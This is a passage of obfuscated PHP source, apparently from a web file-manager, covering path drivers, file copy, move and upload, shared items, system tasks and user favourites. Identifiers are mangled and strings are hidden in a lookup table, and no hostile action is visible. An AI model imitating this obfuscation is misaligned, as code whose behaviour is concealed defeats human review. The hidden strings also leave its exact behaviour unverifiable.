$this->infoSimple($¨‹°íÜ); return $¾¸ûâå ? $¾¸ûâå[$_SERVER[ìïæ“œî][32]] : !1; } public function getPathOuter($é”øé§) { if (!$é”øé§) { return $é”øé§; } $Â¤ø÷ñÁ = $this->parse($é”øé§); return KodIO::make($Â¤ø÷ñÁ[$_SERVER[ìïæ“œî][475]]); } public function copyFolderFromIO($Õ†ğÈ…è, $ßÃôî¥, $ñ£™ƒ«, $æÍìÑç, $É­Ï×¡) { $†¡¸õŠõ = $this->model->copyFolderFromIO($Õ†ğÈ…è, $ßÃôî¥, $ñ£™ƒ«, $æÍìÑç, $É­Ï×¡); return KodIO::make($†¡¸õŠõ); } public function isParentOf($¸ÂÂ®·¬, $ìêßşµ…) { return $this->model->isParentOf($¸ÂÂ®·¬, $ìêßşµ…); } public function mkfile($¶îÎ‚’İ, $®°àÇ× = '', $çÕÉ¡ú¼ = REPEAT_RENAME) { $˜±öÜû´ =& $_SERVER[ìïæ“œî]; $„¥Í”Õû = $this->parse($¶îÎ‚’İ); $¶îÎ‚’İ = $„¥Í”Õû[$˜±öÜû´[475]]; for ($ö¦ŸÅµ¾ = 0; $ö¦ŸÅµ¾ < count($„¥Í”Õû[$˜±öÜû´[1395]]); $ö¦ŸÅµ¾++) { $ÄØŠÙÄ‡ = $„¥Í”Õû[$˜±öÜû´[1395]][$ö¦ŸÅµ¾]; if ($ö¦ŸÅµ¾ == count($„¥Í”Õû[$˜±öÜû´[1395]]) - 1) { $¶îÎ‚’İ = $this->model->mkfile($¶îÎ‚’İ, $ÄØŠÙÄ‡, $®°àÇ×, $çÕÉ¡ú¼); break; } $¶îÎ‚’İ = $this->model->mkdir($¶îÎ‚’İ, $ÄØŠÙÄ‡, REPEAT_SKIP); } return $this->getPathOuter($¶îÎ‚’İ); } public function mkdir($¼›äîˆ, $®¡¼Æ”Ä = REPEAT_SKIP) { $Œó·èê’ =& $_SERVER[ìïæ“œî]; $ÔÕÙ³Êå = $this->parse($¼›äîˆ); $¼›äîˆ = $ÔÕÙ³Êå[$Œó·èê’[475]]; for ($¦ö„Ü¡µ = 0; $¦ö„Ü¡µ < count($ÔÕÙ³Êå[$Œó·èê’[1395]]); $¦ö„Ü¡µ++) { $Ìà–˜è = $ÔÕÙ³Êå[$Œó·èê’[1395]][$¦ö„Ü¡µ]; $¼›äîˆ = $this->model->mkdir($¼›äîˆ, $Ìà–˜è, $®¡¼Æ”Ä); } return $this->getPathOuter($¼›äîˆ); } public function copyFile($Ç‹†ÌĞ, $à´‹Æ«ë, $¤áø¹¢® = REPEAT_REPLACE) { $ãÆîêß =& $_SERVER[ìïæ“œî]; $Ë“Ã»‘­ = $this->parse($à´‹Æ«ë); $ÔõÍ“­É = $this->model->copy($Ç‹†ÌĞ, $Ë“Ã»‘­[$ãÆîêß[475]], $¤áø¹¢®, $Ë“Ã»‘­[$ãÆîêß[87]]); return $ÔõÍ“­É ? $this->getPathOuter($ÔõÍ“­É) : !1; } public function moveFile($ªººˆ¶ñ, $¿îà›š, $¥…¨¿Æ = REPEAT_REPLACE) { $¥å®ä‹ğ =& $_SERVER[ìïæ“œî]; $¿É±óü… = $this->parse($¿îà›š); $É­ÊÂåÍ = $this->model->move($ªººˆ¶ñ, $¿É±óü…[$¥å®ä‹ğ[475]], $¥…¨¿Æ, $¿É±óü…[$¥å®ä‹ğ[87]]); return $É­ÊÂåÍ ? $this->getPathOuter($É­ÊÂåÍ) : !1; } public function copy($ĞµŠÅå, $…¸ á±, $˜ØÈó˜Î = REPEAT_REPLACE, $é†ËÈæ = false) { $¹ĞûóÍ = $this->parse($…¸ á±); $ù«œÎÑù = $this->model->copy($ĞµŠÅå, $¹ĞûóÍ[$_SERVER[ìïæ“œî][475]], $˜ØÈó˜Î, $é†ËÈæ); return $ù«œÎÑù ? $this->getPathOuter($ù«œÎÑù) : !1; } public function moveSameAllow() { } public function move($™¾Ú½·û, $ıîš»ºĞ, $ğãĞØä„ = REPEAT_REPLACE, $­õÚ÷ß = false) { $‘û£ğ²Ş = $this->parse($ıîš»ºĞ); $ÈğØ£óé = $this->model->move($™¾Ú½·û, $‘û£ğ²Ş[$_SERVER[ìïæ“œî][475]], $ğãĞØä„, $­õÚ÷ß); return $ÈğØ£óé ? $this->getPathOuter($ÈğØ£óé) : !1; } public function remove($óƒÓ¡ò, $Ñ¡åİÃ = true) { return $this->model->remove($óƒÓ¡ò, $Ñ¡åİÃ); } public function rename($õí„Ã–·, $¦‡‡’‰á) { $¼à”€§Í = $this->model->rename($õí„Ã–·, $¦‡‡’‰á); return $¼à”€§Í ? $this->getPathOuter($õí„Ã–·) : $¼à”€§Í; } public function size($‡†ïòŸÌ) { $ï™˜×€ = $this->infoSimple($‡†ïòŸÌ); return $ï™˜×€ ? $ï™˜×€[$_SERVER[ìïæ“œî][79]] : 0; } public function infoSimple($ÇŞöâê) { return $this->model->sourceInfo($ÇŞöâê); } public function info($˜—óªç¤) { return $this->infoParse($˜—óªç¤); } public function infoAuth($æğ¹’Ù…) { return $this->infoParse($æğ¹’Ù…, !1, !0); } public function infoWithChildren($îÃÔØ»š) { return $this->infoParse($îÃÔØ»š, !0); } protected function infoParse($¤Àõ‘Ç², $¬Ïœ‡Ÿµ = false, $¥º©‚Áâ = false) { if (!$¬Ïœ‡Ÿµ) { return $this->model->pathInfo($¤Àõ‘Ç², $¥º©‚Áâ); } return $this->model->pathInfoMore($¤Àõ‘Ç²); } public function infoFullSimple($Ù‰Ã¡åé) { $¡Ìàá =& $_SERVER[ìïæ“œî]; $ƒÖ€ğ‡Ÿ = explode($¡Ìàá[8], $Ù‰Ã¡åé); $ª—Š´«Ç = implode($¡Ìàá[8], array_splice($ƒÖ€ğ‡Ÿ, 1)); return $this->model->pathInfoByPath($ƒÖ€ğ‡Ÿ[0], $ª—Š´«Ç); } public function infoFull($…Åå’Ë) { $ á”ŸÖß = $this->infoFullSimple($…Åå’Ë); return is_array($ á”ŸÖß) ? $this->model->pathInfo($ á”ŸÖß[$_SERVER[ìïæ“œî][193]]) : !1; } public function hashSimple($ç°òıÎ) { $Îé¿ß•€ =& $_SERVER[ìïæ“œî]; $“æ¦’ê¯ = $this->infoWithChildren($ç°òıÎ); return $“æ¦’ê¯[$Îé¿ß•€[170]][$Îé¿ß•€[672]]; } public function hashMd5($²¢›Ú¢­) { $¤Øİ» =& $_SERVER[ìïæ“œî]; $òèşéÚ = $this->infoWithChildren($²¢›Ú¢­); return $òèşéÚ[$¤Øİ»[170]][$¤Øİ»[547]]; } public function exist($È¡ô€Õç) { $É”³Æ¶¦ =& $_SERVER[ìïæ“œî]; $»É²€“ = $this->parse($È¡ô€Õç); if (!$»É²€“[$É”³Æ¶¦[87]]) { return $this->isFile($È¡ô€Õç) || $this->isFolder($È¡ô€Õç); } $•¾äÛ¦Ï = array($É”³Æ¶¦[477] => $»É²€“[$É”³Æ¶¦[475]], $É”³Æ¶¦[32] => $»É²€“[$É”³Æ¶¦[87]]); $ø¼íû¼” = $this->model->where($•¾äÛ¦Ï)->find(); return $ø¼íû¼” ? !0 : !1; } public function isFile($ßæ¿ĞĞ) { $º–¦´„Ö =& $_SERVER[ìïæ“œî]; $¡¨á¤Õ¡ = $this->infoSimple($ßæ¿ĞĞ); return $¡¨á¤Õ¡ && $¡¨á¤Õ¡[$º–¦´„Ö[485]] == $º–¦´„Ö[228] ? !0 : !1; } public function isFolder($§‘ÉÇÙğ) { $¥Á÷Ó·· =& $_SERVER[ìïæ“œî]; $Ùæ“İÉ = $this->infoSimple($§‘ÉÇÙğ); return $Ùæ“İÉ && $Ùæ“İÉ[$¥Á÷Ó··[485]] == $¥Á÷Ó··[91] ? !0 : !1; } public function listPath($œ¼“ÄĞ, $¨ğ‡ºÊô = false) { $çÍõİ„¾ =& $_SERVER[ìïæ“œî]; if ($œ¼“ÄĞ == $çÍõİ„¾[12]) { return !1; } $ú«Üéà’ = array($çÍõİ„¾[477] => $œ¼“ÄĞ); if ($¨ğ‡ºÊô) { return $this->model->listSource($ú«Üéà’, -1); } return $this->model->listSource($ú«Üéà’); } public function has($¯Ş­ Ã, $ùÁÊî = false, $Ó¢ÒÚÓ = null) { $­²Ç½œ­ =& $_SERVER[ìïæ“œî]; $À…ËÕÔö = $this->infoWithChildren($¯Ş­ Ã); if ($ùÁÊî) { return array($­²Ç½œ­[240] => $À…ËÕÔö[$­²Ç½œ­[240]], $­²Ç½œ­[239] => $À…ËÕÔö[$­²Ç½œ­[239]]); } return $Ó¢ÒÚÓ ? $À…ËÕÔö[$­²Ç½œ­[240]] : $À…ËÕÔö[$­²Ç½œ­[239]]; } public function listAll($×¬¿ß§) { $²¦Ê¿‘ = IO::info($this->pathParse[$_SERVER[ìïæ“œî][87]]); if (!$²¦Ê¿‘) { return array(); } return $this->model->listAll($×¬¿ß§); } public function getContent($şÍ­Ã) { return $this->model->getContent($şÍ­Ã); } public function setContent($Ü«Ş²Õ, $‹îÉù€Å = '') { return $this->model->setContent($Ü«Ş²Õ, $‹îÉù€Å); } public function fileSubstr($å¼óóğ, $¤—¡Œ±ş, $÷Û”‚) { return $this->model->fileSubstr($å¼óóğ, $¤—¡Œ±ş, $÷Û”‚); } public function download($ÃÁ°Û¿, $ğ”ùÄã” = '') { $ìÙëÀ¶œ = get_path_father($ğ”ùÄã”); $£­¶›ıË = get_path_this($ğ”ùÄã”); $é€ÎÌÓ = $this->model->fileInfoGet($ÃÁ°Û¿); $ºŠà²Í = IO::copy($é€ÎÌÓ[$_SERVER[ìïæ“œî][87]], $ìÙëÀ¶œ, !1, $£­¶›ıË); return $ºŠà²Í; } public function setModifyTime($òÓÔØöË, $˜üêéÊÃ = '') { $‡Èóº÷’ =& $_SERVER[ìïæ“œî]; if (!$òÓÔØöË) { return; } $this->model->where(array($‡Èóº÷’[491] => $òÓÔØöË))->save(array($‡Èóº÷’[88] => $˜üêéÊÃ)); } public function upload($‘™çÇ¢ò, $±­İ×µ, $—â™şò = false, $Ö€‡…ø– = REPEAT_REPLACE) { $˜ÉŞ„É =& $_SERVER[ìïæ“œî]; $È”¯ûËœ = $this->parse($‘™çÇ¢ò); $÷öŸËˆ¢ = $this->model->addFile($È”¯ûËœ[$˜ÉŞ„É[475]], $±­İ×µ, $È”¯ûËœ[$˜ÉŞ„É[87]], $—â™şò, $Ö€‡…ø–); return $this->getPathOuter($÷öŸËˆ¢); } public function uploadFileByID($Ô‘ıòØ„, $Ø”Ô£€è, $¦ıåËÎ) { $¥¢Äõİ =& $_SERVER[ìïæ“œî]; $Ê®¬° = $this->parse($Ô‘ıòØ„); $¶ù°œÁî = $this->model->addFileByFileID($Ê®¬°[$¥¢Äõİ[475]], $Ø”Ô£€è, $Ê®¬°[$¥¢Äõİ[87]], $¦ıåËÎ); return $this->getPathOuter($¶ù°œÁî); } public function addFileByRemote($É¬Î¶˜, $€¿‡Ó‹Ê, $¬¯¢µù  = array(), $©áø¤Â = '', $¤°Â¥¯) { $ÊŞ–€àã =& $_SERVER[ìïæ“œî]; $‚°ƒ¼©ª = $this->parse($É¬Î¶˜); $©áø¤Â = empty($©áø¤Â) ? $‚°ƒ¼©ª[$ÊŞ–€àã[87]] : $©áø¤Â; $—…ò­¹ò = $this->model->addFileByRemote($‚°ƒ¼©ª[$ÊŞ–€àã[475]], $€¿‡Ó‹Ê, $©áø¤Â, $¬¯¢µù , $¤°Â¥¯); return $this->getPathOuter($—…ò­¹ò); } public function uploadLink($Ä“·¹ˆ, $»­Ó£èè = 0) { $Ğôé™³— =& $_SERVER[ìïæ“œî]; $½´€Ëˆà = $this->parse($Ä“·¹ˆ); $ğäé²ëÚ = _get($GLOBALS[$Ğôé™³—[7]], $Ğôé™³—[1396]); $¶Ç­õô› = _get($GLOBALS[$Ğôé™³—[7]], $Ğôé™³—[1397]); $Ä“·¹ˆ = Model($Ğôé™³—[674])->createFileName($½´€Ëˆà[$Ğôé™³—[87]], $ğäé²ëÚ, $¶Ç­õô›); return IO::uploadLink($Ä“·¹ˆ, $»­Ó£èè); } public function fileNameAuto($Ö¬ãêé”, $·ôû´ , $Ÿ×£Ì„ = REPEAT_REPLACE, $›„ùËÃ = false) { return $this->model->fileNameAuto($Ö¬ãêé”, $·ôû´ , $Ÿ×£Ì„, $›„ùËÃ); } public function fileNameExist($»®²˜ñ•, $ÔÇöÖø) { return $this->model->fileNameExist($»®²˜ñ•, $ÔÇöÖø); } protected function _fileOut($š¼³Ç¾¥, $Ö¶®Úë€ = false, $šÕ§İæÑ = false, $­ÁË³© = '', $¹Š¹÷ª“ = false) { $é˜§­Ùî =& $_SERVER[ìïæ“œî]; $¿‰Şìä£ = $this->model->sourceInfo($š¼³Ç¾¥); if ($¿‰Şìä£[$é˜§­Ùî[485]] == $é˜§­Ùî[91]) { header($é˜§­Ùî[1398]); die; } $Â»±¬»• = $this->model->fileInfoGet($š¼³Ç¾¥); $­ÁË³© = $Â»±¬»•[$é˜§­Ùî[547]] ? $Â»±¬»•[$é˜§­Ùî[547]] : $­ÁË³©; $Ÿ›™°ıì = isset($GLOBALS[$é˜§­Ùî[182]]) && is_array($GLOBALS[$é˜§­Ùî[182]]) ? $GLOBALS[$é˜§­Ùî[182]][$é˜§­Ùî[32]] : $¿‰Şìä£[$é˜§­Ùî[32]]; if ($¹Š¹÷ª“) { return IO::fileOutServer($Â»±¬»•[$é˜§­Ùî[87]], $Ö¶®Úë€, $Ÿ›™°ıì, $­ÁË³©); } IO::fileOut($Â»±¬»•[$é˜§­Ùî[87]], $Ö¶®Úë€, $Ÿ›™°ıì, $­ÁË³©); } public function fileOut($ãõô¶ù, $¼«ë¾õ = false, $³Ëæ· • = false, $óá¬è¾Ä = '') { $this->_fileOut($ãõô¶ù, $¼«ë¾õ, $³Ëæ· •, $óá¬è¾Ä); } public function fileOutServer($í¡½Ï¡ª, $»Óªş·“ = false, $õŸ˜–ûš = false, $±€¬Ü„ş = '') { $this->_fileOut($í¡½Ï¡ª, $»Óªş·“, $õŸ˜–ûš, $±€¬Ü„ş, !0); } protected function _fileOutImage($°Î«½‡ú, $ú³Ú Á« = 250) { $Œ‚Áöş =& $_SERVER[ìïæ“œî]; $Çú ëã = $this->model->pathInfo($°Î«½‡ú); if ($Çú ëã[$Œ‚Áöş[485]] == $Œ‚Áöş[91]) { show_json($Œ‚Áöş[1399] . $°Î«½‡ú, !1); } $‰Î€××± = $this->model->fileInfoGet($°Î«½‡ú); $Çú ëã[$Œ‚Áöş[183]] = $‰Î€××±[$Œ‚Áöş[87]]; $GLOBALS[$Œ‚Áöş[182]] = $Çú ëã; IO::fileOutImage($‰Î€××±[$Œ‚Áöş[87]], $ú³Ú Á«); } public function fileOutImage($¿Ô·¤™ñ, $ûÚ¯ıÊ› = 250) { $this->_fileOutImage($¿Ô·¤™ñ, $ûÚ¯ıÊ›); } public function fileOutImageServer($åıü¿ª™, $ÅêÈ® = 250) { $this->_fileOutImage($åıü¿ª™, $ÅêÈ®); } public function link($ñ‚æÛê¯, $¨Š¯¬‘ = '') { $ïæ«Áşó = $this->model->fileInfoGet($ñ‚æÛê¯); return IO::link($ïæ«Áşó[$_SERVER[ìïæ“œî][87]], $¨Š¯¬‘); } protected function parse($öÄ‚ß®¹) { $“›É°Ü =& $_SERVER[ìïæ“œî]; if (strstr($öÄ‚ß®¹, $“›É°Ü[8]) === !1) { return array($“›É°Ü[493] => intval($öÄ‚ß®¹), $“›É°Ü[87] => $“›É°Ü[12], $“›É°Ü[1395] => array()); } $½‡’šÖ = explode($“›É°Ü[8], trim($öÄ‚ß®¹, $“›É°Ü[8])); if (count($½‡’šÖ) < 2) { show_tips(clear_html($öÄ‚ß®¹) . $“›É°Ü[1400]); } return array($“›É°Ü[493] => intval($½‡’šÖ[0]), $“›É°Ü[87] => $½‡’šÖ[1], $“›É°Ü[1395] => array_slice($½‡’šÖ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ëÈüãèû) { $this->pathParse = $ëÈüãèû; $this->model = Model($_SERVER[ìïæ“œî][1394]); } public function getPathOuter($ãø©İ²â) { $…âòëˆ– =& $_SERVER[ìïæ“œî]; if (!$ãø©İ²â) { return $ãø©İ²â; } $¤‘°Ü²Ã = $this->parse($ãø©İ²â); return trim(KodIO::makeShare($this->pathParse[$…âòëˆ–[475]], $¤‘°Ü²Ã[$…âòëˆ–[475]]), $…âòëˆ–[8]); } protected function infoParse($¥Ó×˜ã’, $ö½Ùä­ = false, $Ô¡ó´²¤ = false) { $¾ÊÕ›ßá =& $_SERVER[ìïæ“œî]; $›áà§ÛŸ = $this->pathParse[$¾ÊÕ›ßá[475]]; $³şÍ±àˆ = trim($this->pathParse[$¾ÊÕ›ßá[1227]], $¾ÊÕ›ßá[8]); return Action($¾ÊÕ›ßá[1401])->sharePathInfo($›áà§ÛŸ, $³şÍ±àˆ, $ö½Ùä­); } public function infoFull($ÊºÒñœ) { $—ßö”Ûò =& $_SERVER[ìïæ“œî]; $ïîæŠÈ = explode($—ßö”Ûò[8], trim($ÊºÒñœ, $—ßö”Ûò[8])); if (count($ïîæŠÈ) > 1) { $Ï¨Á‚³Ï = implode($—ßö”Ûò[8], array_splice($ïîæŠÈ, 1)); $¯ñ‡¹¥æ = $this->model->pathInfoByPath($ïîæŠÈ[0], $Ï¨Á‚³Ï); if (!$¯ñ‡¹¥æ) { return !1; } $this->pathParse[$—ßö”Ûò[1227]] = $¯ñ‡¹¥æ[$—ßö”Ûò[193]]; } return $this->infoParse($ÊºÒñœ); } public function listAll($ì¶ïšú») { $®ÂŸ½÷ =& $_SERVER[ìïæ“œî]; $®Ø´§ğ = IO::info($this->pathParse[$®ÂŸ½÷[87]]); if (!$®Ø´§ğ) { return array(); } $û¶å÷ıË = $this->model->listAll($ì¶ïšú»); $•Õ¿”² = Model($®ÂŸ½÷[664])->getInfo($®Ø´§ğ[$®ÂŸ½÷[665]]); foreach ($û¶å÷ıË as &$©öİ±¾à) { check_abort(); $©öİ±¾à[$®ÂŸ½÷[90]] = Action($®ÂŸ½÷[1401])->_shareItemeParse($©öİ±¾à[$®ÂŸ½÷[90]], $•Õ¿”²); } unset($©öİ±¾à); return $û¶å÷ıË; } } goto Fí‹ÆÅ˜æ; DÉŸ¥×ù¾¹: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\164\x61\x73\x6b\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\164\171\x70\145", "\x65\x76\145\x6e\x74", "\x74\151\x6d\145", "\144\x65\x73\143", "\x73\x79\163\x74\x65\x6d", "\x65\x6e\141\x62\154\145", "\x6c\x61\x73\x74\x52\x75\156", "\x73\x6f\162\x74"); public function listData($äÅ”´ Ñ = false, $ØİƒÕ‘¾ = "\x73\157\162\164", $ÍÒ‹·ş = false) { return parent::listData($äÅ”´ Ñ, $ØİƒÕ‘¾, $ÍÒ‹·ş); } public function add($Ìˆ¤ìŠ¡) { $½èØô =& $_SERVER[ìïæ“œî]; $º´…å± = $this->findByName($Ìˆ¤ìŠ¡[$½èØô[32]]); if ($º´…å±) { return !1; } $Ìˆ¤ìŠ¡[$½èØô[1698]] = 0; $Ìˆ¤ìŠ¡[$½èØô[1970]] = $this->getSort(); return parent::insert($Ìˆ¤ìŠ¡); } private function getSort() { $Ìˆ–“ş =& $_SERVER[ìïæ“œî]; $æåÉï‚İ = parent::listData(); $èò½î›Ì = array_to_keyvalue($æåÉï‚İ, $Ìˆ–“ş[12], $Ìˆ–“ş[1970]); return empty($èò½î›Ì) ? 0 : max($èò½î›Ì) + 1; } public function update($„²üø¬„, $ìÏ²Ñ§¶) { $ã²›ñ =& $_SERVER[ìïæ“œî]; $ï«ì“ˆô = $this->listData($„²üø¬„); $€Ê‡ƒØ = $this->findByName($ìÏ²Ñ§¶[$ã²›ñ[32]]); if (!$ï«ì“ˆô || $€Ê‡ƒØ && $€Ê‡ƒØ[$ã²›ñ[475]] != $ï«ì“ˆô[$ã²›ñ[475]]) { return !1; } return parent::update($„²üø¬„, $ìÏ²Ñ§¶); } public function remove($©şğº„Í, $€°íìÕ£ = false) { $Üêœ“Õ =& $_SERVER[ìïæ“œî]; $ø­µ­š = $this->listData($©şğº„Í); if (!$ø­µ­š) { return; } if (!$€°íìÕ£ && $ø­µ­š[$Üêœ“Õ[191]] == $Üêœ“Õ[91]) { return !1; } return parent::remove($©şğº„Í); } public function enable($ä•ÃßıÄ, $Œ´ŞÓÁÚ) { return $this->update($ä•ÃßıÄ, array($_SERVER[ìïæ“œî][2410] => $Œ´ŞÓÁÚ)); } public function run($§™ÍÅùÔ) { return $this->update($§™ÍÅùÔ, array($_SERVER[ìïæ“œî][2422] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ñ½Æ€´Ò) { $úºœóšı =& $_SERVER[ìïæ“œî]; return array($úºœóšı[2061] => array(USER_ID, $úºœóšı[2423])); } protected function listData() { $—©ôíºÙ =& $_SERVER[ìïæ“œî]; $Î½‰ôä = array($—©ôíºÙ[1738] => USER_ID, $—©ôíºÙ[557] => 0); $Ñ©ìûó = $—©ôíºÙ[2424]; $ØÙßï¿ò = $this->field($Ñ©ìûó)->where($Î½‰ôä)->order($—©ôíºÙ[2425])->select(); return $ØÙßï¿ò ? $ØÙßï¿ò : array(); } protected function resetCache() { } protected function listView() { $‰š…÷¸ =& $_SERVER[ìïæ“œî]; $Ç¦ùš¨’ = $this->listData(); $ÕˆùÓï£ = array_filter_by_field($Ç¦ùš¨’, $‰š…÷¸[33], $‰š…÷¸[490]); $¸×àºƒß = array_to_keyvalue($ÕˆùÓï£, $‰š…÷¸[12], $‰š…÷¸[87]); if (!$¸×àºƒß) { return $Ç¦ùš¨’; } $å‘Ü¹–– = 2000; $–®öë‰á = array($‰š…÷¸[491] => array($‰š…÷¸[492], $¸×àºƒß)); $¼’£é¬» = Model($‰š…÷¸[873])->listSource($–®öë‰á, $å‘Ü¹––); $¼’£é¬» = array_merge($¼’£é¬»[$‰š…÷¸[86]], $¼’£é¬»[$‰š…÷¸[85]]); $¼’£é¬» = array_to_keyvalue($¼’£é¬», $‰š…÷¸[193]); foreach ($Ç¦ùš¨’ as $óÑ÷ª… => $‚Úëñæ–) { $£µ¨©‘† = $¼’£é¬»[$‚Úëñæ–[$‰š…÷¸[87]]]; $£µ¨©‘† = $£µ¨©‘† ? $£µ¨©‘† : array(); $Ç¦ùš¨’[$óÑ÷ª…] = array_merge($£µ¨©‘†, $‚Úëñæ–); } return $Ç¦ùš¨’; } protected function addFav($ÌšºÕŠĞ, $Áœ‘×™Ì = '', $ïßÛ—«† = "\x73\157\165\x72\143\x65") { $í¿ŒòÀ =& $_SERVER[ìïæ“œî]; $é ó»•¯ = array($í¿ŒòÀ[1738] => USER_ID, $í¿ŒòÀ[557] => 0, $í¿ŒòÀ[496] => $ïßÛ—«†, $í¿ŒòÀ[495] => $ÌšºÕŠĞ); if ($this->where($é ó»•¯)->find()) { return !1; } $é ó»•¯ = array($í¿ŒòÀ[1738] => USER_ID, $í¿ŒòÀ[557] => 0); $¯¼îÊ¾‘ = $this->where($é ó»•¯)->max($í¿ŒòÀ[1970]); if (!$¯¼îÊ¾‘) { $¯¼îÊ¾‘ = 0; } if (!$Áœ‘×™Ì && $ïßÛ—«† == $í¿ŒòÀ[490]) { $ı©ÚòÊ = Model($í¿ŒòÀ[1394])->where(array($í¿ŒòÀ[491] => $ÌšºÕŠĞ))->find(); if (!$ı©ÚòÊ) { return !1; } $Áœ‘×™Ì = $ı©ÚòÊ[$í¿ŒòÀ[32]]; } $Áœ‘×™Ì = $this->getAutoName($Áœ‘×™Ì); $™ï±·¦ò = array($í¿ŒòÀ[1738] => USER_ID, $í¿ŒòÀ[557] => 0, $í¿ŒòÀ[494] => $Áœ‘×™Ì, $í¿ŒòÀ[495] => $ÌšºÕŠĞ, $í¿ŒòÀ[496] => $ïßÛ—«†, $í¿ŒòÀ[1950] => $¯¼îÊ¾‘ + 1); return $this->add($™ï±·¦ò); } protected function remove($’¿˜§«) { $İ•éãÓŒ =& $_SERVER[ìïæ“œî]; $Ã©èÏÖÁ = array($İ•éãÓŒ[1738] => USER_ID, $İ•éãÓŒ[493] => $’¿˜§«); return $this->where($Ã©èÏÖÁ)->delete(); } protected function removeByName($ÒŠñçĞÈ) { $œ½ÏÌ”¿ =& $_SERVER[ìïæ“œî]; $ßí‰™Æµ = array($œ½ÏÌ”¿[1738] => USER_ID, $œ½ÏÌ”¿[494] => $ÒŠñçĞÈ, $œ½ÏÌ”¿[557] => 0); return $this->where($ßí‰™Æµ)->delete(); } protected function rename($í–»ƒ±½, $ßˆó¼æ») { $‹¤‚—ñ =& $_SERVER[ìïæ“œî]; if ($í–»ƒ±½ == $ßˆó¼æ») { return !1; } $à™áŸÊ = $this->getAutoName($ßˆó¼æ»); if ($ßˆó¼æ» != $à™áŸÊ) { return !1; } $æ™ÔÁé = array($‹¤‚—ñ[1738] => USER_ID, $‹¤‚—ñ[557] => 0, $‹¤‚—ñ[32] => $í–»ƒ±½); return $this->where($æ™ÔÁé)->save(array($‹¤‚—ñ[32] => $ßˆó¼æ»)); } protected function resetSort($Ê´ëÚÆú) { $´×©û—à =& $_SERVER[ìïæ“œî]; $Ê´ëÚÆú = is_array($Ê´ëÚÆú) ? $Ê´ëÚÆú : array(); $ĞŠšíé½ = array($´×©û—à[1738] => USER_ID); for ($ Ó­‚´À = 0; $ Ó­‚´À < count($Ê´ëÚÆú); $ Ó­‚´À++) { $ĞŠšíé½[$´×©û—à[493]] = $Ê´ëÚÆú[$ Ó­‚´À]; $this->where($ĞŠšíé½)->save(array($´×©û—à[1950] => $ Ó­‚´À + 1)); } return !0; } protected function moveTop($Ã´Â÷‚©) { $·Ş’úşÎ =& $_SERVER[ìïæ“œî]; $öé¥Øœ£ = array($·Ş’úşÎ[1738] => USER_ID, $·Ş’úşÎ[557] => 0); $“„£—Ôø = $this->where($öé¥Øœ£)->where(array($·Ş’úşÎ[32] => $Ã´Â÷‚©))->find(); if (!$“„£—Ôø) { return; } $ ì½÷À½ = $this->field($·Ş’úşÎ[475])->where($öé¥Øœ£)->order($·Ş’úşÎ[2425])->select(); $ ì½÷À½ = array_to_keyvalue($ ì½÷À½, $·Ş’úşÎ[12], $·Ş’úşÎ[475]); $£•ÕÓíç = $ ì½÷À½; $ ì½÷À½ = array_remove_value($ ì½÷À½, $“„£—Ôø[$·Ş’úşÎ[475]]); array_unshift($ ì½÷À½, $“„£—Ôø[$·Ş’úşÎ[475]]); return $this->resetSort($ ì½÷À½); } protected function moveBottom($¥ª‚€îƒ) { $â·Ô =& $_SERVER[ìïæ“œî]; $ïõÏË„ì = array($â·Ô[1738] => USER_ID, $â·Ô[557] => 0); $ĞÃ¤«‰˜ = $this->where($ïõÏË„ì)->max($â·Ô[1970]); $ùî‡“½ß = array($â·Ô[1970] => $ĞÃ¤«‰˜ + 1); return $this->where($ïõÏË„ì)->where(array($â·Ô[32] => $¥ª‚€îƒ))->save($ùî‡“½ß); } private function getAutoName($£ºãç½¹) { $òÕ¡ç‘à =& $_SERVER[ìïæ“œî]; $û™ó¬®œ = array($òÕ¡ç‘à[1738] => USER_ID, $òÕ¡ç‘à[557] => 0); $Ë°ìÚöÉ = $this->field($òÕ¡ç‘à[32])->where($û™ó¬®œ)->select(); $Ë°ìÚöÉ = array_to_keyvalue($Ë°ìÚöÉ, $òÕ¡ç‘à[12], $òÕ¡ç‘à[32]); if (!$Ë°ìÚöÉ || !in_array($£ºãç½¹, $Ë°ìÚöÉ)) { return $£ºãç½¹; } for ($ÆÇ‹¦¸ = 0; $ÆÇ‹¦¸ < count($Ë°ìÚöÉ); $ÆÇ‹¦¸++) { if (!in_array($£ºãç½¹ . "\x28{$ÆÇ‹¦¸}\51", $Ë°ìÚöÉ)) { return $£ºãç½¹ . "\50{$ÆÇ‹¦¸}\51"; } } return $£ºãç½¹ . "\50{$ÆÇ‹¦¸}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\152\x6f\x62\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\144\145\163\x63", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\x65\x6c\x66\112\157\x62\114\x69\163\164"; public function listData($áŞÓ·÷Ç = false, $ìç­›ç = "\x73\157\162\164", $‡ĞùÚ¾İ = false) { return parent::listData($áŞÓ·÷Ç, $ìç­›ç, $‡ĞùÚ¾İ); } public function remove($‰²âñ•Ì) { return parent::remove($‰²âñ•Ì); } public function add($‘Ì§ÔÈí) { $À¯‚º‚« =& $_SERVER[ìïæ“œî]; if ($this->findByName($‘Ì§ÔÈí[$À¯‚º‚«[32]])) { return !1; } $‘Ì§ÔÈí[$À¯‚º‚«[1970]] = $this->getSort(); return parent::insert($‘Ì§ÔÈí); } private function getSort() { $¥Û¾”´à =& $_SERVER[ìïæ“œî]; $‰¨÷ºÈâ = parent::listData(); $ÆƒÍ®¨ = array_to_keyvalue($‰¨÷ºÈâ, $¥Û¾”´à[12], $¥Û¾”´à[1970]); return empty($ÆƒÍ®¨) ? 0 : max($ÆƒÍ®¨) + 1; } public function update($€†…ÌŒª, $ ™ÀËôÙ) { $ßÙ’ƒùà =& $_SERVER[ìïæ“œî]; $ãÅøŞ‚Á = parent::listData($€†…ÌŒª); $éš‰×¸Ö = $this->findByName($ ™ÀËôÙ[$ßÙ’ƒùà[32]]); if (!$ãÅøŞ‚Á || $éš‰×¸Ö && $éš‰×¸Ö[$ßÙ’ƒùà[475]] != $ãÅøŞ‚Á[$ßÙ’ƒùà[475]]) { return !1; } return parent::update($€†…ÌŒª, $ ™ÀËôÙ); } public function 